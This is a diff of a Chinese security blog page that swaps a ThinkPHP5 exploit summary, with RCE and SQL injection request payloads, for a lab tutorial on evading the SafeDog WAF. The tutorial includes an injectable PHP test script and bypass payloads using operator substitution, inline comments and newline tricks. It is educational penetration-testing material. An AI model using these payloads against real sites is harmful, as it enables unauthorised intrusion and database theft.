@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="漏洞复现,">
+  <meta name="keywords" content="绕安全狗,">
 
 
 
@@ -83,25 +83,35 @@
 
 
 
-<meta name="description" content="人生是个圆，有的人走了一辈子也没有走出命运画出的圆圈，其实，圆上的每一个点都有一条腾飞的切线。      ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞漏洞描述ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。 漏洞等级高级 漏洞危害远程代码执行 漏洞">
-<meta name="keywords" content="漏洞复现">
+<meta name="description" content="从来不需要想起，永远也不会忘记。   攻击的特定:攻击二象性:已知攻击和未知攻击 目前市面主流的WAF产品:云WAF ​    阿里云盾 ​    腾讯网站管家 ​    创宇盾 ​    ClodeFlare等  软件产品类 安全狗 云锁 360主机卫士 ModSecurity  硬件类型设备: 启明星辰  ​    绿盟  ​    天融信  ​    飞塔等   硬件waf缺陷:对HTTP协">
+<meta name="keywords" content="绕安全狗">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Thinkphp5漏洞总结">
-<meta property="og:url" content="https://louisnie.github.io/2019/03/13/thinkphp5版本漏洞/index.html">
+<meta property="og:title" content="绕waf系列之绕安全狗">
+<meta property="og:url" content="https://louisnie.github.io/2019/07/04/绕安全狗/index.html">
 <meta property="og:site_name" content="Louisnie">
-<meta property="og:description" content="人生是个圆，有的人走了一辈子也没有走出命运画出的圆圈，其实，圆上的每一个点都有一条腾飞的切线。      ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞漏洞描述ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。 漏洞等级高级 漏洞危害远程代码执行 漏洞">
+<meta property="og:description" content="从来不需要想起，永远也不会忘记。   攻击的特定:攻击二象性:已知攻击和未知攻击 目前市面主流的WAF产品:云WAF ​    阿里云盾 ​    腾讯网站管家 ​    创宇盾 ​    ClodeFlare等  软件产品类 安全狗 云锁 360主机卫士 ModSecurity  硬件类型设备: 启明星辰  ​    绿盟  ​    天融信  ​    飞塔等   硬件waf缺陷:对HTTP协">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/0078beR7ly1g0zd9tfx20j30o30njab8.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/0078beR7ly1g0ze9m9nofj31710olmyw.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/0078beR7ly1g0zd9tfx20j30o30njab8.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/0078beR7ly1g0zd4qm4p3j30vr0g6q4a.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/0078beR7ly1g0zerz57y4j30i00fojro.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/0078beR7ly1g0zf2z9v1ej30og0kf3zk.jpg">
-<meta property="og:updated_time" content="2019-07-03T08:00:03.488Z">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1Wry1eWSs3KVjSZPi763siVXaZ.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1Jg1Te.GF3KVjSZFv762_nXXaF.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1uK5Re2WG3KVjSZFP760aiXXa3.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1Wqm1e8Cw3KVjSZR0762cUpXa1.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1A7WSe81D3KVjSZFy762uFpXaW.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1yleSe81D3KVjSZFy762uFpXaV.png">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1mnaRe2WG3KVjSZFPq6xaiXXaI.jpg">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1nHmWe9WD3KVjSZSgq6ACxVXav.jpg">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1SdWTe8OD3KVjSZFFq6An9pXaH.jpg">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1DkaRe2WG3KVjSZFgq6zTspXab.jpg">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB14rWSe.GF3KVjSZFoq6zmpFXay.jpg">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1h.jkbMFY.1VjSZFnq6AFHXXak.jpg">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1IdeUe.GF3KVjSZFvq6z_nXXaT.jpg">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1CzORe3aH3KVjSZFjq6AFWpXa1.jpg">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1t6WTe75E3KVjSZFCq6zuzXXaI.jpg">
+<meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1P4GVe8WD3KVjSZKPq6yp7FXa6.jpg">
+<meta property="og:updated_time" content="2019-07-03T17:06:10.908Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Thinkphp5漏洞总结">
-<meta name="twitter:description" content="人生是个圆，有的人走了一辈子也没有走出命运画出的圆圈，其实，圆上的每一个点都有一条腾飞的切线。      ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞漏洞描述ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。 漏洞等级高级 漏洞危害远程代码执行 漏洞">
-<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/0078beR7ly1g0zd9tfx20j30o30njab8.jpg">
+<meta name="twitter:title" content="绕waf系列之绕安全狗">
+<meta name="twitter:description" content="从来不需要想起，永远也不会忘记。   攻击的特定:攻击二象性:已知攻击和未知攻击 目前市面主流的WAF产品:云WAF ​    阿里云盾 ​    腾讯网站管家 ​    创宇盾 ​    ClodeFlare等  软件产品类 安全狗 云锁 360主机卫士 ModSecurity  硬件类型设备: 启明星辰  ​    绿盟  ​    天融信  ​    飞塔等   硬件waf缺陷:对HTTP协">
+<meta name="twitter:image" content="https://ae01.alicdn.com/kf/HTB1Wry1eWSs3KVjSZPi763siVXaZ.png">
 
 
 
@@ -131,7 +141,7 @@
 
 
 
-  <link rel="canonical" href="https://louisnie.github.io/2019/03/13/thinkphp5版本漏洞/">
+  <link rel="canonical" href="https://louisnie.github.io/2019/07/04/绕安全狗/">
 
 
 
@@ -140,7 +150,7 @@
 <script src="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js"></script>
 
-  <title>Thinkphp5漏洞总结 | Louisnie</title>
+  <title>绕waf系列之绕安全狗 | Louisnie</title>
   
 
 
@@ -345,7 +355,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://louisnie.github.io/2019/03/13/thinkphp5版本漏洞/">
+    <link itemprop="mainEntityOfPage" href="https://louisnie.github.io/2019/07/04/绕安全狗/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Louisnie">
@@ -362,7 +372,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Thinkphp5漏洞总结</h1>
+          <h1 class="post-title" itemprop="name headline">绕waf系列之绕安全狗</h1>
         
 
         <div class="post-meta">
@@ -374,8 +384,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-13T16:45:28+08:00">
-                2019-03-13
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-04T00:56:28+08:00">
+                2019-07-04
               </time>
             
 
@@ -397,8 +407,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/中间件漏洞/" itemprop="url" rel="index">
-                    <span itemprop="name">中间件漏洞</span>
+                  <a href="/categories/绕waf/" itemprop="url" rel="index">
+                    <span itemprop="name">绕waf</span>
                   </a>
                 </span>
 
@@ -428,7 +438,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  889 字
+                  1,882 字
                 </span>
               
 
@@ -453,60 +463,127 @@
       
 
       
-        <blockquote class="blockquote-center">人生是个圆，有的人走了一辈子也没有走出命运画出的圆圈，其实，圆上的每一个点都有一条腾飞的切线。</blockquote>
+        <blockquote class="blockquote-center">从来不需要想起，永远也不会忘记。</blockquote>
 
-<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=194405&auto=1&height=66"></iframe></div>
-
-
-
-<h1 id="ThinkPHP5-5-0-22-5-1-29-远程代码执行漏洞"><a href="#ThinkPHP5-5-0-22-5-1-29-远程代码执行漏洞" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞"></a>ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p>
-<h2 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h2><p>高级</p>
-<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>远程代码执行</p>
-<h2 id="漏洞检测方法"><a href="#漏洞检测方法" class="headerlink" title="漏洞检测方法"></a>漏洞检测方法</h2><p>利用POC去试验是否存在该漏洞</p>
-<h2 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h2><p>启动docker环境:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p><img src="http://ww1.sinaimg.cn/large/0078beR7ly1g0zd9tfx20j30o30njab8.jpg" alt=""></p>
-<p>然后修改URL中的参数,构造POC,成功执行命令</p>
-<p><img src="http://ww1.sinaimg.cn/large/0078beR7ly1g0ze9m9nofj31710olmyw.jpg" alt=""></p>
-<p>发送的数据包为:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1`</span><br></pre></td></tr></table></figure>
-<p>也可以执行其他命令,只需替换vars[0]的值即可</p>
-<h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案:"></a>漏洞修复方案:</h2><p>1,及时去thinkphp官网修补漏洞</p>
-<p>2,更新到最新版</p>
-<h1 id="ThinkPHP5-5-0-23-远程代码执行漏洞"><a href="#ThinkPHP5-5-0-23-远程代码执行漏洞" class="headerlink" title="ThinkPHP5 5.0.23 远程代码执行漏洞"></a>ThinkPHP5 5.0.23 远程代码执行漏洞</h1><h2 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，在获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</p>
-<h2 id="漏洞等级-1"><a href="#漏洞等级-1" class="headerlink" title="漏洞等级"></a>漏洞等级</h2><p>高级</p>
-<h2 id="漏洞危害-1"><a href="#漏洞危害-1" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>远程代码执行</p>
-<h2 id="漏洞检测方法-1"><a href="#漏洞检测方法-1" class="headerlink" title="漏洞检测方法"></a>漏洞检测方法</h2><p>利用POC去试验是否存在该漏洞</p>
-<h2 id="漏洞利用方法-1"><a href="#漏洞利用方法-1" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h2><p>启动docker环境:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p><img src="http://ww1.sinaimg.cn/large/0078beR7ly1g0zd9tfx20j30o30njab8.jpg" alt=""></p>
-<p>然后刷新页面,构造POC,成功执行命令</p>
-<p><img src="http://ww1.sinaimg.cn/large/0078beR7ly1g0zd4qm4p3j30vr0g6q4a.jpg" alt=""></p>
-<p>发送的数据包为:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 192.168.136.128:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 72</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure>
-<p>也可以执行其他命令,只需替换server[REQUEST_METHOD]的值即可</p>
-<h2 id="漏洞修复方案-1"><a href="#漏洞修复方案-1" class="headerlink" title="漏洞修复方案:"></a>漏洞修复方案:</h2><p>1,及时去thinkphp官网修补漏洞</p>
-<p>2,更新到最新版</p>
-<h1 id="ThinkPHP5版本-SQL注入漏洞和敏感信息泄露漏洞"><a href="#ThinkPHP5版本-SQL注入漏洞和敏感信息泄露漏洞" class="headerlink" title="ThinkPHP5版本 SQL注入漏洞和敏感信息泄露漏洞"></a>ThinkPHP5版本 SQL注入漏洞和敏感信息泄露漏洞</h1><h2 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>ThinkPHP5版本存在一个鸡肋的SQL注入漏洞,可以获取到当前用户和密码以及数据库名等信息,详情参考:<a href=""><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></a></p>
-<h2 id="漏洞等级-2"><a href="#漏洞等级-2" class="headerlink" title="漏洞等级"></a>漏洞等级</h2><p>低危</p>
-<h2 id="漏洞危害-2"><a href="#漏洞危害-2" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>获取到数据库配置信息(用户名,密码,数据库名,主机名)</p>
-<h2 id="漏洞检测方法-2"><a href="#漏洞检测方法-2" class="headerlink" title="漏洞检测方法"></a>漏洞检测方法</h2><p>利用POC去试验是否存在该漏洞</p>
-<h2 id="漏洞利用方法-2"><a href="#漏洞利用方法-2" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h2><p>启动docker环境:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>如果出现以下错误:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)</span><br></pre></td></tr></table></figure>
-<p>那么需要去修改<code>/etc/resolv.conf</code>修改为:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nameserver 8.8.8.8</span><br><span class="line">nameserver 8.8.4.4</span><br><span class="line">nameserver 10.0.0.10</span><br></pre></td></tr></table></figure>
-<p>访问以下URL进入网站,出现用户名表示成功访问:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://Your-Ip/index.php?ids[]=1&amp;ids[]=2</span><br></pre></td></tr></table></figure>
-<p><img src="http://ww1.sinaimg.cn/large/0078beR7ly1g0zerz57y4j30i00fojro.jpg" alt=""></p>
-<p>然后使用xpath报错的方法去构造POC,成功执行命令</p>
-<p>请求的URL为:</p>
-<p><a href="http://192.168.136.128/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1" target="_blank" rel="noopener">http://192.168.136.128/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</span><br></pre></td></tr></table></figure>
-<p><img src="http://ww1.sinaimg.cn/large/0078beR7ly1g0zf2z9v1ej30og0kf3zk.jpg" alt=""></p>
-<h2 id="漏洞修复方案-2"><a href="#漏洞修复方案-2" class="headerlink" title="漏洞修复方案:"></a>漏洞修复方案:</h2><p>1,及时去thinkphp官网修补漏洞</p>
-<p>2,更新到最新版</p>
+<p><div class="aplayer" data-id="22854159" data-server="netease" data-type="song" data-mode="single"></div></p>
+<h2 id="攻击的特定"><a href="#攻击的特定" class="headerlink" title="攻击的特定:"></a>攻击的特定:</h2><p>攻击二象性:已知攻击和未知攻击</p>
+<h2 id="目前市面主流的WAF产品"><a href="#目前市面主流的WAF产品" class="headerlink" title="目前市面主流的WAF产品:"></a>目前市面主流的WAF产品:</h2><h3 id="云WAF"><a href="#云WAF" class="headerlink" title="云WAF"></a>云WAF</h3><ul>
+<li>​    阿里云盾</li>
+<li>​    腾讯网站管家</li>
+<li>​    创宇盾</li>
+<li>​    ClodeFlare等</li>
+</ul>
+<h3 id="软件产品类"><a href="#软件产品类" class="headerlink" title="软件产品类"></a>软件产品类</h3><ul>
+<li>安全狗</li>
+<li>云锁</li>
+<li>360主机卫士</li>
+<li>ModSecurity</li>
+</ul>
+<h3 id="硬件类型设备"><a href="#硬件类型设备" class="headerlink" title="硬件类型设备:"></a>硬件类型设备:</h3><ul>
+<li><p>启明星辰</p>
+</li>
+<li><p>​    绿盟</p>
+</li>
+<li><p>​    天融信</p>
+</li>
+<li><p>​    飞塔等</p>
+</li>
+</ul>
+<p>硬件waf缺陷:对HTTP协议的兼容性不强,对异常报文会产生bug,导致绕过</p>
+<h2 id="WAF的核心原理"><a href="#WAF的核心原理" class="headerlink" title="WAF的核心原理:"></a>WAF的核心原理:</h2><ul>
+<li><p>运用黑白思想</p>
+</li>
+<li><p>特征匹配,漏洞签名:特定特征的漏洞,比如stract2漏洞</p>
+</li>
+<li><p>对匹配结果进行响应(拦截,记录)</p>
+</li>
+</ul>
+<h2 id="WAF的几种部署模式"><a href="#WAF的几种部署模式" class="headerlink" title="WAF的几种部署模式"></a>WAF的几种部署模式</h2><h3 id="基于DNS解析"><a href="#基于DNS解析" class="headerlink" title="基于DNS解析"></a>基于DNS解析</h3><p>修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1Wry1eWSs3KVjSZPi763siVXaZ.png" alt=""></p>
+<h3 id="串联模式"><a href="#串联模式" class="headerlink" title="串联模式"></a>串联模式</h3><p>一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署.</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://ae01.alicdn.com/kf/HTB1Jg1Te.GF3KVjSZFv762_nXXaF.png" alt=""></h3><p><img src="https://ae01.alicdn.com/kf/HTB1uK5Re2WG3KVjSZFP760aiXXa3.png" alt=""></p>
+<h3 id="旁路模式"><a href="#旁路模式" class="headerlink" title="旁路模式"></a>旁路模式</h3><p>利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断.</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1Wqm1e8Cw3KVjSZR0762cUpXa1.png" alt=""></p>
+<h3 id="软件嵌入中间件-检测引擎模式"><a href="#软件嵌入中间件-检测引擎模式" class="headerlink" title="软件嵌入中间件+检测引擎模式"></a>软件嵌入中间件+检测引擎模式</h3><p>在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1A7WSe81D3KVjSZFy762uFpXaW.png" alt=""></p>
+<h2 id="WAF为什么会被绕过"><a href="#WAF为什么会被绕过" class="headerlink" title="WAF为什么会被绕过:"></a>WAF为什么会被绕过:</h2><p>1.鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作</p>
+<p>2.WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性</p>
+<p>3.硬件WAF自身往往存在漏洞</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1yleSe81D3KVjSZFy762uFpXaV.png" alt=""></p>
+<ul>
+<li><p>架构:waf部署模式</p>
+</li>
+<li><p>规则缺陷/特性</p>
+</li>
+<li><p>协议:指HTTP0.9协议:TCP长连接</p>
+</li>
+</ul>
+<h2 id="WAF绕过实战—-绕过安全狗进行注入"><a href="#WAF绕过实战—-绕过安全狗进行注入" class="headerlink" title="WAF绕过实战—-绕过安全狗进行注入"></a>WAF绕过实战—-绕过安全狗进行注入</h2><p>所谓的bypass waf实际上是去寻找位于waf设备之后处理应用层数据包的硬件/软件的特性,利用特性构造waf不能命中,但是在应用程序能够执行成功的payload,绕过防护</p>
+<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境:"></a>实验环境:</h3><p>环境:安全狗Apache最新版(<a href="http://download.safedog.cn/download/software/safedogwzApache.exe)+phpstudy+windows系统" target="_blank" rel="noopener">http://download.safedog.cn/download/software/safedogwzApache.exe)+phpstudy+windows系统</a></p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1mnaRe2WG3KVjSZFPq6xaiXXaI.jpg" alt=""></p>
+<p>本地测试代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&apos;id&apos;];</span><br><span class="line">$con = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">if (!$con)&#123;die(&apos;Could not connect: &apos; . mysql_error());&#125;</span><br><span class="line">mysql_select_db(&quot;dvwa&quot;, $con);</span><br><span class="line">$query = &quot;SELECT first_name,last_name FROM users WHERE user_id = &apos;$id&apos;; &quot;;</span><br><span class="line">$result = mysql_query($query)or die(&apos;&lt;pre&gt;&apos;.mysql_error().&apos;&lt;/pre&gt;&apos;);</span><br><span class="line">while($row = mysql_fetch_array($result))</span><br><span class="line">&#123; </span><br><span class="line">echo $row[&apos;0&apos;] . &quot;&amp;nbsp&quot; . $row[&apos;1&apos;]; </span><br><span class="line">echo &quot;&lt;br /&gt;&quot;;&#125;echo &quot;&lt;br/&gt;&quot;;echo $query;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="绕过拦截and-1-1"><a href="#绕过拦截and-1-1" class="headerlink" title="绕过拦截and 1=1"></a>绕过拦截and 1=1</h3><p>首先先稍微测试一番,发现存在安全狗</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1  and 1=1%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://ae01.alicdn.com/kf/HTB1nHmWe9WD3KVjSZSgq6ACxVXav.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">and  1	拦截</span><br><span class="line">and  &apos;1&apos;    拦截  </span><br><span class="line">and  a	不拦截 </span><br><span class="line">and  &apos;a&apos;    拦截  </span><br><span class="line">and  !	不拦截 </span><br><span class="line">and  1+1    拦截  </span><br><span class="line">and  1+a    拦截  </span><br><span class="line">and  hex(1)  不拦截</span><br></pre></td></tr></table></figure>
+<p>通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有2个思路</p>
+<ul>
+<li>用其他字符替换 and 或者 or</li>
+<li>带入的不是字符串和数字型，带入一个特殊符号</li>
+</ul>
+<p>针对第一种我们可以去看看运算符号 随便找到几个| ^ xor &amp; / * &amp;&amp; || 等等还有很多</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">与运算 a &amp; b  , </span><br><span class="line">或运算 a | b ,  </span><br><span class="line">异或运算 a ^ b</span><br></pre></td></tr></table></figure>
+<p>那么可以试着将and替换成&amp;&amp;,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1&apos; %26%26 true%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://ae01.alicdn.com/kf/HTB1SdWTe8OD3KVjSZFFq6An9pXaH.jpg" alt=""></p>
+<p>另外在分享一些可以绕过目前版本的安全狗测试payload,(注:mysql支持&amp;&amp;  || ,oracle不支持 &amp;&amp; ||）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1&apos;  || true%23         //将and 1=1替换为|| true,也可以绕过安全狗</span><br><span class="line">http://127.0.0.1/test.php?id=1&apos;   ||(1) %23 		//使用括号代替空格绕过</span><br><span class="line">//异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1）</span><br><span class="line">http://127.0.0.1/test.php?id=1&apos;  xor 1%23			</span><br><span class="line">http://127.0.0.1/test.php?id=1&apos;  xor true%23</span><br></pre></td></tr></table></figure>
+<h3 id="绕过order-by查询"><a href="#绕过order-by查询" class="headerlink" title="绕过order by查询"></a>绕过order by查询</h3><p>判断查询字段,使用mysql的<code>/*!*/</code> 内敛注释去绕过防护,而其中的代码是可以正常执行的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1&apos; /*!order*//*!by*/2%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://ae01.alicdn.com/kf/HTB1DkaRe2WG3KVjSZFgq6zTspXab.jpg" alt=""></p>
+<h3 id="绕过union-select查询"><a href="#绕过union-select查询" class="headerlink" title="绕过union select查询"></a>绕过union select查询</h3><p>使用union xxx页面正常,</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB14rWSe.GF3KVjSZFoq6zmpFXay.jpg" alt=""></p>
+<p>但是用union和select放在在一起就被发现啦</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1h.jkbMFY.1VjSZFnq6AFHXXak.jpg" alt=""></p>
+<p>在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1&apos;=/*!user () regexp 0x5e72*/--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://ae01.alicdn.com/kf/HTB1IdeUe.GF3KVjSZFvq6z_nXXaT.jpg" alt=""></p>
+<ul>
+<li>对于数字型注入,可以将其转换成浮点型</li>
+<li>联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过,</li>
+<li>函数中可以插入任何混淆字符绕过waf</li>
+<li>另外使用-1可以省去空格绕过waf</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://ae01.alicdn.com/kf/HTB1CzORe3aH3KVjSZFjq6AFWpXa1.jpg" alt=""></p>
+<p>基于报错信息的注入绕安全狗</p>
